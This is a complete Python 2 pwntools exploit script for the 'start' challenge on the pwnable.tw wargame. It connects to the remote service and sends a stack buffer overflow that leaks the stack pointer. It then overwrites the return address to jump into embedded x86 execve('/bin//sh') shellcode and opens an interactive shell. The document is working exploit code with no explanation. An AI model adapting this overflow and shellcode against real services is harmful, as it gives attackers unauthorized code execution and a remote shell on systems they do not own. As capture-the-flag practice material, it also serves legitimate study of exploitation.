from pwn import *
#p = process('./start')
p = remote('chall.pwnable.tw',10000)
p.recvuntil(':')
p.send('A'*0x14+p32(0x8048087))
old_esp = u32(p.recv(4))
print 'old_esp = '+hex(old_esp)
shellcode='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload = 'B'*0x14+p32(old_esp+0x14)+shellcode
#gdb.attach(p)
p.send(payload)
p.interactive()
